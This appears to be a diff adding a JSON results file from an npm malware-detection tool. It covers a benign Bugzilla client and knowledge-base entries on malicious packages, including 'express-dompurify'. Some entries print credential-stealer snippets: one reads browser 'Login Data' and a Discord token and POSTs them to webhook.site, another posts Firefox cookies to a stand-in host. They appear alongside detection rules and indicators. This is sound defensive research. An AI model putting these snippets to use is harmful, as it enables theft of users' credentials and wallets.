+                  "why_suspicious": "Accessing and decrypting browser-stored credentials is a direct method of credential theft and is not required for DOM sanitization.",
+                  "violated_expectations": "A legitimate DOM sanitization library should never access or decrypt browser login data, as this is unrelated to its intended functionality.",
+                  "similar_legitimate_use": "Forensics or password recovery tools may access such data, but only with explicit user consent and for legitimate recovery purposes.",
+                  "key_indicators": [
+                    "Access to browser profile directories",
+                    "Reading and decrypting 'Login Data' SQLite files",
+                    "Use of system APIs for credential decryption",
+                    "Preparation of credentials for network exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime",
+                  "file_location": "main package JavaScript file (index.js or similar)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-dompurify",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (as of report time)",
+                  "why_malicious": "The package impersonates the trusted DOMPurify library and contains heavily obfuscated JavaScript code that, upon import or execution, steals sensitive data from the host system—including browser credentials, cryptocurrency wallet files, keychain data, and system identifiers—and exfiltrates this information to an attacker-controlled server via hardcoded network requests."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obfuscated code is loaded and executed upon import or at runtime.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Sensitive data collection from the host system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Harvest browser credentials by reading and decrypting browser profile data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive credentials are prepared for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvest cryptocurrency wallet files from known wallet directories.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Wallet data is prepared for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collect system information (e.g., serial number) and package all stolen data.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Data is ready for exfiltration"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Exfiltrate all collected data to the attacker's server via HTTP POST.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives sensitive data; compromise complete"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to browser profile directories and 'Login Data' SQLite files",
+                    "Decryption of browser-stored credentials using system APIs",
+                    "Access to cryptocurrency wallet directories such as ~/.electrum and ~/.bitcoin",
+                    "Obfuscated code with dynamic variable and function names",
+                    "Outbound HTTP POST requests to hardcoded, non-standard endpoints"
+                  ],
+                  "file_indicators": [
+                    "Access to files like 'Login Data' in browser profile directories",
+                    "Access to ~/.electrum, ~/.bitcoin, and similar wallet directories",
+                    "Presence of obfuscated code blocks and dynamic variable arrays in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to http://95.216.251.178:8001/uploads",
+                    "Outbound connections to hardcoded IP addresses or domains not associated with the legitimate DOMPurify library"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that access browser profile or wallet directories, especially those that read and decrypt 'Login Data' files or access ~/.electrum and ~/.bitcoin. Flag any package making HTTP POST requests to unknown or hardcoded endpoints, particularly http://95.216.251.178:8001/uploads. Use static and dynamic analysis to detect obfuscated code and dynamic variable/function name generation. Alert on any package that exfiltrates system information or sensitive files to external servers."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bz/0.4.5/package/bz-0.4.5.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "bz-0.4.5_slice_1",
+          "code_snippet": "\"use strict\";\n\nvar XMLHttpRequest = require('./xhr').XMLHttpRequest;\n\nconst LOGIN = '/login';\nconst TIMEOUT_ERRORS = ['ETIMEDOUT', 'ESOCKETTIMEDOUT'];\n\nfunction extractField(id, callback) {\n  if (typeof id === 'function') {\n    callback = id;\n    id = undefined;\n  }\n\n  return function (err, response) {\n    if (err) return callback(err);\n\n    if (response) {\n      if (id === undefined) {\n        id = Object.keys(response)[0];\n      }\n      callback(null, response[id]);\n    } else {\n      throw \"Error:, no response in extractField\";\n    }\n  };\n}\n\nfunction loginRequired(method) {\n  return function () {\n    var args = Array.prototype.slice.call(arguments),\n      callback = args[args.length - 1];\n\n    this.login((function (err) {\n      if (err) return callback(err);\n      method.apply(this, args);\n    }).bind(this));\n  };\n}\n\nclass BugzillaClient {\n  constructor(options) {\n    options = options || {};\n\n    this.username = options.username;\n    this.password = options.password;\n    this.timeout = options.timeout || 0;\n    this.api_key = options.api_key || null;\n\n    if (options.test) {\n      throw new Error('options.test is deprecated please specify the url directly');\n    }\n\n    this.apiUrl = options.url || 'https://bugzilla.mozilla.org/rest/';\n    this.apiUrl = this.apiUrl.replace(/\\/$/, \"\");\n\n    this._auth = null;\n  }\n\n  login(callback) {\n    if (this._auth) {\n      callback(null, this._auth);\n      return;\n    }\n\n    if (!this.username || !this.password) {\n      throw new Error('missing or invalid .username or .password');\n    }\n\n    var params = {\n      login: this.username,\n      password: this.password\n    };\n\n    var handleLogin = (function handleLogin(err, response) {\n      if (err) return callback(err);\n      if (response.result) {\n        this._auth = response.result;\n      } else {\n        this._auth = response;\n      }\n      callback(null, response);\n    }).bind(this);\n\n    this.APIRequest('/login', 'GET', handleLogin, null, null, params);\n  }\n\n  getBug(id, params, callback) {\n    if (!callback) {\n      callback = params;\n      params = {};\n    }\n\n    this.APIRequest('/bug/' + id, 'GET', extractField(callback), 'bugs', null, params);\n  }\n\n  searchBugs(params, callback) {\n    this.APIRequest('/bug', 'GET', callback, 'bugs', null, params);\n  }\n\n  updateBug(id, bug, callback) {\n    this.APIRequest('/bug/' + id, 'PUT', callback, 'bugs', bug);\n  }\n\n  createBug(bug, callback) {\n    this.APIRequest('/bug', 'POST', callback, 'id', bug);\n  }\n\n  bugComments(id, callback) {\n    var _callback = function _callback(e, r) {\n      if (e) throw e;\n      var _bug_comments = r[id];\n      if (typeof _bug_comments['comments'] !== 'undefined') {\n        _bug_comments = _bug_comments.comments;\n      }\n      callback(null, _bug_comments);\n    };\n\n    this.APIRequest('/bug/' + id + '/comment', 'GET', _callback, 'bugs');\n  }\n\n  addComment(id, comment, callback) {\n    this.APIRequest('/bug/' + id + '/comment', 'POST', callback, null, comment);\n  }\n\n  bugHistory(id, callback) {\n    this.APIRequest('/bug/' + id + '/history', 'GET', callback, 'bugs');\n  }\n\n  bugAttachments(id, callback) {\n    this.APIRequest('/bug/' + id + '/attachment', 'GET', extractField(id, callback), 'bugs');\n  }\n\n  createAttachment(id, attachment, callback) {\n    this.APIRequest('/bug/' + id + '/attachment', 'POST', extractField(callback), 'ids', attachment);\n  }\n\n  getAttachment(id, callback) {\n    this.APIRequest('/bug/attachment/' + id, 'GET', extractField(callback), 'attachments');\n  }\n\n  updateAttachment(id, attachment, callback) {\n    this.APIRequest('/bug/attachment/' + id, 'PUT', callback, 'ok', attachment);\n  }\n\n  searchUsers(match, callback) {\n    this.APIRequest('/user', 'GET', callback, 'users', null, { match: match });\n  }\n\n  getUser(id, callback) {\n    this.APIRequest('/user/' + id, 'GET', extractField(callback), 'users');\n  }\n\n  getSuggestedReviewers(id, callback) {\n    this.APIRequest('/review/suggestions/' + id, 'GET', callback);\n  }\n\n  getConfiguration(params, callback) {\n    if (!callback) {\n      callback = params;\n      params = {};\n    }\n\n    var that = this;\n\n    var req = new XMLHttpRequest();\n    req.open('GET', 'https://api-dev.bugzilla.mozilla.org/latest/configuration', true);\n    req.setRequestHeader(\"Accept\", \"application/json\");\n    req.onreadystatechange = function (event) {\n      if (req.readyState == 4 && req.status != 0) {\n        that.handleResponse(null, req, callback);\n      }\n    };\n    req.timeout = this.timeout;\n    req.ontimeout = function (event) {\n      that.handleResponse('timeout', req, callback);\n    };\n    req.onerror = function (event) {\n      that.handleResponse('error', req, callback);\n    };\n    req.send();\n  }\n\n  APIRequest(path, method, callback, field, body, params) {\n    if (\n      path === LOGIN ||\n      this._auth ||\n      !this.password || !this.username) {\n      return this._APIRequest.apply(this, arguments);\n    }\n\n    var args = [].slice.call(arguments);\n\n    this.login((function (err) {\n      if (err) return callback(err);\n      this._APIRequest.apply(this, args);\n    }).bind(this));\n  }\n\n  _APIRequest(path, method, callback, field, body, params) {\n    var url = this.apiUrl + path;\n\n    params = params || {};\n\n    if (this.api_key) {\n      params.api_key = this.api_key;\n    }\n\n    if (this._auth) {\n      params.token = this._auth.token;\n    } else if (this.username && this.password) {\n      params.login = this.username;\n      params.password = this.password;\n    }\n\n    if (params && Object.keys(params).length > 0) {\n      url += \"?\" + this.urlEncode(params);\n    }\n\n    body = JSON.stringify(body);\n\n    var that = this;\n\n    var req = new XMLHttpRequest();\n    req.open(method, url, true);\n    req.setRequestHeader(\"Accept\", \"application/json\");\n    if (method.toUpperCase() !== \"GET\") {\n      req.setRequestHeader(\"Content-Type\", \"application/json\");\n    }\n    req.onreadystatechange = function (event) {\n      if (req.readyState == 4 && req.status != 0) {\n        that.handleResponse(null, req, callback, field);\n      }\n    };\n    req.timeout = this.timeout;\n    req.ontimeout = function (event) {\n      that.handleResponse('timeout', req, callback);\n    };\n    req.onerror = function (event) {\n      that.handleResponse(event, req, callback);\n    };\n    req.send(body);\n  }\n\n  handleResponse(err, response, callback, field) {\n    if (err && err.code && TIMEOUT_ERRORS.indexOf(err.code) !== -1) {\n      return callback(new Error('timeout'));\n    }\n\n    if (err) return callback(err);\n\n    var requestSuccessful = response.status > 199 && response.status < 300;\n\n    var parsedBody;\n\n    try {\n      parsedBody = JSON.parse(response.responseText);\n    } catch (e) {\n      if (requestSuccessful) {\n        return callback(new Error('response was not valid json: ' + response.responseText));\n      }\n    }\n\n    if (typeof parsedBody['result'] !== 'undefined') {\n      parsedBody = parsedBody['result'];\n    }\n\n    if (parsedBody && parsedBody.error) {\n      requestSuccessful = false;\n    }\n\n    if (!requestSuccessful) {\n      return callback(new Error('HTTP status ' + response.status + '\\n' + (\n        parsedBody && parsedBody.message) ? parsedBody.message : ''));\n    }\n\n    callback(null, field ? parsedBody[field] : parsedBody);\n  }\n\n  urlEncode(params) {\n    var url = [];\n    for (var param in params) {\n      var values = params[param];\n      if (!values.forEach) values = [values];\n      values.forEach(function (value) {\n        url.push(encodeURIComponent(param) + \"=\" + encodeURIComponent(value));\n      });\n    }\n    return url.join(\"&\");\n  }\n}\n\nexports.BugzillaClient = BugzillaClient;\n\nfunction createClient(options) {\n  return new BugzillaClient(options);\n}\n\n// xhr.js\n'use strict';\n\nvar XMLHttpRequest = null;\n\nexports.XMLHttpRequest = XMLHttpRequest;\nif (typeof window === 'undefined') {\n  var _loader = require;\n  try {\n    exports.XMLHttpRequest = XMLHttpRequest = _loader('sdk/net/xhr').XMLHttpRequest;\n  } catch (e) {\n    exports.XMLHttpRequest = XMLHttpRequest = _loader(\"xmlhttprequest\").XMLHttpRequest;\n  }\n} else if (typeof window !== 'undefined' && typeof window.XMLHttpRequest !== 'undefined') {\n  exports.XMLHttpRequest = XMLHttpRequest = window.XMLHttpRequest;\n} else {\n  throw \"No window, WAT.\";\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.4871465345223745,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses hardcoded URLs 'https://bugzilla.mozilla.org/rest/' and 'https://api-dev.bugzilla.mozilla.org/latest/configuration' via XMLHttpRequest to perform authenticated REST API operations including login with provided username and password, bug retrieval, updates, comments, attachments, user searches, and configuration fetching. It uses sensitive data such as username, password, and API keys to authenticate and sends this data as URL parameters or JSON bodies over HTTPS. This enables remote interaction with Bugzilla's API, potentially facilitating unauthorized access or data exfiltration if credentials are compromised.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate client library for interacting with the Bugzilla REST API. It uses XMLHttpRequest to perform authenticated API calls with user-provided credentials (username, password, API key) over HTTPS to official Bugzilla endpoints. While it handles sensitive data, it does so in the context of authorized API usage, not unauthorized data exfiltration or credential theft. The code does not exhibit obfuscation, local file access, environment variable harvesting, or network exfiltration to attacker-controlled endpoints. The closest similarity is to Example 1, which involves requiring a local malicious file to hide payloads, but this code requires legitimate modules or standard XMLHttpRequest implementations. The other examples involve direct credential theft and exfiltration, which are not present here. Therefore, despite handling sensitive data, the code is a benign API client without malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104013_892794_snippet_2",
+              "source_package": "ca-bucky-client (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_892794/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5282438397407532,
+              "code_similarity": 0.6492244005203247,
+              "behavior_similarity": 0.40726327896118164,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "XMLHttpRequest = require(\"./xmlhttprequest\").XMLHttpRequest;",
+                "code_behavior": "During installation, the code in bucky.js requires a local xmlhttprequest.js file instead of the legitimate npm package, loading the actual malicious payload for execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Redirecting a require statement to a local file with the same name as a popular package is a known obfuscation and privilege escalation technique, often used to hide malicious code.",
+                  "violated_expectations": "Legitimate code would require the official xmlhttprequest package from npm, not a local file with the same name.",
+                  "similar_legitimate_use": "Local shims may be used for testing in development environments, but not in published production packages.",
+                  "key_indicators": [
+                    "require statement points to local xmlhttprequest.js",
+                    "Deviation from expected dependency usage"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via bucky.js)",
+                  "file_location": "bucky.js",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "ca-bucky-client",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.2 and later (0.0.1 is not malicious)",
+                  "why_malicious": "The package is malicious because, during installation, it executes obfuscated JavaScript code that harvests all environment variables and system information, performs anti-analysis checks to evade detection, encodes the stolen data using a custom base64 variant, and exfiltrates it to a remote server controlled by the attacker. This behavior can result in the theft of sensitive credentials, such as AWS keys, and is designed to bypass both automated and manual analysis."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script executes bucky.js, which loads the malicious xmlhttprequest.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution in xmlhttprequest.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "xmlhttprequest.js collects all environment variables from the host system.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System and credential data harvested"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Performs anti-analysis checks to avoid sandboxes, certain usernames, and specific NPM registries.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Conditional execution or early exit"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Encodes the collected data using a custom base64 function to evade detection.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Obfuscated data ready for exfiltration"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Dynamically constructs the HTTP request method name to further obfuscate network activity.",
+                    "implemented_by": [
+                      "snippet_7"
+                    ],
+                    "leads_to": "Network exfiltration step"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Sends the obfuscated environment data to a remote server controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data (final goal)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Preinstall script execution of local JavaScript files during npm install",
+                    "Bulk access to process.env during installation",
+                    "Outbound network requests to external servers during install phase",
+                    "Obfuscated or dynamically constructed method names in network code",
+                    "Anti-analysis checks for usernames, registry mirrors, or analysis environments"
+                  ],
+                  "file_indicators": [
+                    "Presence of xmlhttprequest.js in package root directory",
+                    "package.json with preinstall script referencing bucky.js",
+                    "require statements for local xmlhttprequest.js in bucky.js"
+                  ],
+                  "network_indicators": [
+                    "Requests to *.wixsite.com/*/_functions/*",
+                    "Outbound HTTP(S) requests initiated during npm install",
+                    "Encoded (base64 with inserted string) payloads in HTTP request bodies"
+                  ],
+                  "how_to_detect": "Monitor npm packages for preinstall scripts that execute local files, especially those that access process.env or initiate outbound network requests. Flag packages containing xmlhttprequest.js not present in the legitimate upstream. Detect obfuscated code that dynamically constructs method names or encodes data with non-standard base64 (e.g., with inserted strings). Alert on network traffic to known exfiltration endpoints such as wixsite.com/_functions/ during package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113641_174600_snippet_2",
+              "source_package": "MUT-8694 (multiple typosquatted packages) (npm, PyPI)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113641_174600/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47659504413604736,
+              "code_similarity": 0.4451632499694824,
+              "behavior_similarity": 0.5080268383026123,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// JavaScript (Blank Grabber/Skuld Stealer core logic)\nconst fs = require('fs');\nconst https = require('https');\nconst token = process.env.DISCORD_TOKEN;\nfs.readFile(process.env.APPDATA + '/User Data/Default/Login Data', (err, data) => {\n  if (!err) {\n    const options = {\n      hostname: 'webhook.site',\n      path: '/unique-id',\n      method: 'POST',\n      headers: {'Content-Type': 'application/octet-stream'}\n    };\n    const req = https.request(options);\n    req.write(data);\n    req.end();\n  }\n});",
+                "code_behavior": "At runtime, the code reads sensitive files such as browser login data and environment variables like DISCORD_TOKEN, then exfiltrates this data via HTTPS POST to a remote webhook endpoint controlled by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses credential stores and environment variables containing sensitive information, then transmits this data to an external server, which is a hallmark of infostealer malware.",
+                  "violated_expectations": "Legitimate packages should not access or transmit user credentials or sensitive files without explicit user consent and clear justification.",
+                  "similar_legitimate_use": "Security auditing tools may access such files, but only with user awareness, explicit permission, and for legitimate security purposes.",
+                  "key_indicators": [
+                    "Access to credential stores (browser login data, environment tokens)",
+                    "Exfiltration of data to webhook.site or similar endpoints",
+                    "Use of environment variables for sensitive data extraction",
+                    "Network transmission of credential data without user consent"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "payload.exe (delivered by the package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "MUT-8694 (multiple typosquatted packages)",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions of the malicious typosquatted packages",
+                  "why_malicious": "The packages are part of a coordinated supply chain attack campaign leveraging typosquatting to impersonate legitimate libraries. Upon installation or import, they download and execute infostealer malware (such as Blank Grabber and Skuld Stealer) designed to exfiltrate sensitive data, including credentials and tokens, from infected systems. The packages attempt to appear trustworthy by referencing legitimate tools and use external platforms (GitHub, repl.it) to host and deliver malicious payloads, primarily targeting Windows users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious typosquatted package, triggering the download and execution of a remote payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial payload download and execution on the victim's system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious payload (infostealer) is executed, establishing persistence and preparing to steal sensitive data.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential and data theft capabilities are enabled"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The infostealer accesses sensitive files and environment variables, exfiltrating the stolen data to attacker-controlled endpoints.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and sensitive information from the victim's system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package downloads and executes remote code at import-time or during installation",
+                    "Access to credential stores (browser login data, environment tokens) by package or payload code",
+                    "Exfiltration of sensitive data to external endpoints such as webhook.site, GitHub, or repl.it"
+                  ],
+                  "file_indicators": [
+                    "setup.py or __init__.py containing remote code download and execution logic",
+                    "Unexpected executable files (e.g., payload.exe, malware.py) created during package installation or import",
+                    "References to external code hosting platforms (GitHub, repl.it) in package source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to raw.githubusercontent.com for payload downloads",
+                    "Connections to webhook.site or similar data collection endpoints for exfiltration",
+                    "Downloads from repl.it or other code hosting services during installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that initiate network connections to code hosting or data exfiltration endpoints during installation or import. Flag any package that downloads and executes remote code, accesses credential stores, or references known infostealer infrastructure. Use static analysis to detect suspicious import-time or setup.py logic, and dynamic analysis to observe unexpected network or filesystem activity during package installation or import. Correlate creation of unexpected executables and outbound connections to known malicious infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455673_snippet_4",
+              "source_package": " ()",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_455673/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4613943099975586,
+              "code_similarity": 0.3521519601345062,
+              "behavior_similarity": 0.5706366300582886,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "# Example: Password/cookie stealer (not actual code)\nFile.open(ENV['HOME'] + '/.mozilla/firefox/*.default/cookies.sqlite') do |file|\n  Net::HTTP.post(URI('http://malicious.site/upload'), file.read)\nend",
+                "code_behavior": "At import-time or runtime, the code accesses browser credential files (such as Firefox cookies.sqlite) and exfiltrates their contents to a remote server via HTTP POST, resulting in credential theft.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing browser credential stores and exfiltrating sensitive data to an external server is a clear sign of credential theft.",
+                  "violated_expectations": "Legitimate packages should not access or transmit sensitive browser data without explicit user consent and a valid purpose.",
+                  "similar_legitimate_use": "Browser backup tools may access such files, but only with user consent and never exfiltrate data to untrusted servers.",
+                  "key_indicators": [
+                    "Access to browser credential files (e.g., cookies.sqlite)",
+                    "Network exfiltration of sensitive data via HTTP POST",
+                    "Targeting of browser-specific file paths"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime",
+                  "file_location": "RubyGem package (e.g., chrome_taker, color_hacker, etc.)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "This report is a high-level analysis of the evolution of software supply chain attacks, not a technical deep-dive into a specific malicious package. It describes real-world incidents and attack patterns, but does not provide explicit code snippets or package-level details. The report highlights how attackers leverage open source package ecosystems (npm, PyPI, RubyGems, etc.) to distribute malware, steal credentials, inject backdoors, and perform dependency confusion attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes a malicious package (typosquatting, dependency confusion, or compromised account) to a public repository.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Malicious package is installed by unsuspecting users or CI systems."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at install-time or runtime, harvesting credentials, secrets, or system information.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Sensitive data is collected for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code exfiltrates data to attacker-controlled servers or executes further payloads (e.g., RAT, miner, backdoor).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker gains remote access, steals funds, or uses victim resources."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware may persist, propagate, or tamper with development tools and projects (e.g., IDE backdoors, project injection).",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Long-term compromise and supply chain propagation."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package install or import triggers outbound network requests to untrusted or newly registered domains",
+                    "Access to sensitive files such as browser credential stores, clipboard, or environment variables during install or import",
+                    "Execution of downloaded binaries or remote scripts via child process or shell",
+                    "Modification of clipboard contents or project files without user consent",
+                    "Enumeration and modification of IDE project files or development environments"
+                  ],
+                  "file_indicators": [
+                    "Presence of install scripts (e.g., setup.py, package.json) containing network or file exfiltration logic",
+                    "Unexpected binaries (e.g., miner.sh, rat.exe) present in package or project directories",
+                    "Injected or modified code in IDE project files (e.g., NetBeans project files)",
+                    "Package names that closely resemble popular internal or public packages (typosquatting)"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to domains such as http://malicious.site/miner.sh, http://malicious.site/rat.exe, http://malicious.site/upload, or http://malicious.site/collect during install/import",
+                    "Regular beaconing or data uploads to attacker-controlled C2 infrastructure",
+                    "Network connections to domains associated with credential or wallet theft"
+                  ],
+                  "how_to_detect": "Monitor package installation and import events for unexpected network activity, file access, or process execution. Flag packages that access sensitive files, environment variables, or clipboard data without clear user intent. Detect typosquatting and dependency confusion by comparing package names and sources. Use threat intelligence to block known malicious domains and binaries. Regularly audit installed packages and IDE plugins for unauthorized modifications or injected code."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_214414_450355_snippet_2",
+              "source_package": "mplatlib, markedjs, lemaaa, mrg-message-broker, ua-parser-js (PyPI, npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_214414_450355/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45883989334106445,
+              "code_similarity": 0.42596834897994995,
+              "behavior_similarity": 0.49171140789985657,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function _0x1b96c9(...) { ... eval(...); req['on'](...); req['write'](data); ... } // Obfuscated, long single line",
+                "code_behavior": "At import-time, the code executes an obfuscated JavaScript function that collects data and sends it to an external server via HTTP POST, resulting in exfiltration of sensitive information.",
+                "malice_analysis": {
+                  "why_suspicious": "The only difference from the legitimate package is a single, obfuscated line, which is a common tactic for hiding malicious payloads and evading detection.",
+                  "violated_expectations": "Legitimate packages should not contain obfuscated, undocumented code, especially as the only change from a trusted upstream.",
+                  "similar_legitimate_use": "Obfuscation is sometimes used in commercial JavaScript, but not in open-source clones or as a single-line addition in a forked package.",
+                  "key_indicators": [
+                    "Obfuscated single-line addition in main.js",
+                    "Network exfiltration via HTTP POST",
+                    "Masquerading as a popular package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "markedjs/main.js (single line difference from legitimate package)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mplatlib, markedjs, lemaaa, mrg-message-broker, ua-parser-js",
+                  "package_manager": "PyPI, npm",
+                  "package_versions": "mplatlib: 0.2; markedjs: 3.0.4; lemaaa: (unspecified); mrg-message-broker: 9998.987.376; ua-parser-js: 0.7.29, 0.8.0, 1.0.0",
+                  "why_malicious": "These packages are considered malicious because they use supply chain attack techniques such as typosquatting, masquerading, trojan functionality, dependency confusion, and account hijacking to deliver obfuscated or hidden payloads. These payloads exfiltrate sensitive data (such as credentials and environment variables), steal tokens, or compromise systems. The malicious code is often obfuscated, hidden among legitimate code, or injected into trusted packages, making detection difficult and increasing the risk to the software supply chain."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes a malicious package using typosquatting, masquerading, trojan, dependency confusion, or hijacking methods.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious package is installed by unsuspecting user or CI/CD system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at install-time or import-time, often obfuscated to evade detection.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Sensitive data is accessed or exfiltrated."
+                  },
+                  {
+                    "step": 3,
+                    "action": "At runtime, utility functions or hooks may further exfiltrate credentials or secrets.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker gains access to user accounts or secrets."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrated data is sent to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker achieves final goal: credential theft, system compromise, or disruption."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated code in package entrypoints or main files (e.g., __init__.py, main.js, index.js)",
+                    "Network requests to hardcoded or suspicious domains during install/import (e.g., http://malicious-site.com, http://attacker.com/steal)",
+                    "Access to environment variables or credential files during install/import",
+                    "Single-line or minimal changes in otherwise legitimate codebases (diff against upstream)",
+                    "Unusually high version numbers in public repositories (indicative of dependency confusion)"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated or minified code in __init__.py, index.js, or main.js",
+                    "Unexpected network libraries (requests, http, etc.) in setup.py, __init__.py, or main JavaScript files",
+                    "High version numbers not matching internal repositories or upstream"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS POST requests to unknown or attacker-controlled domains (e.g., http://malicious-site.com, http://attacker.com/steal)",
+                    "Domains not associated with the legitimate package or project"
+                  ],
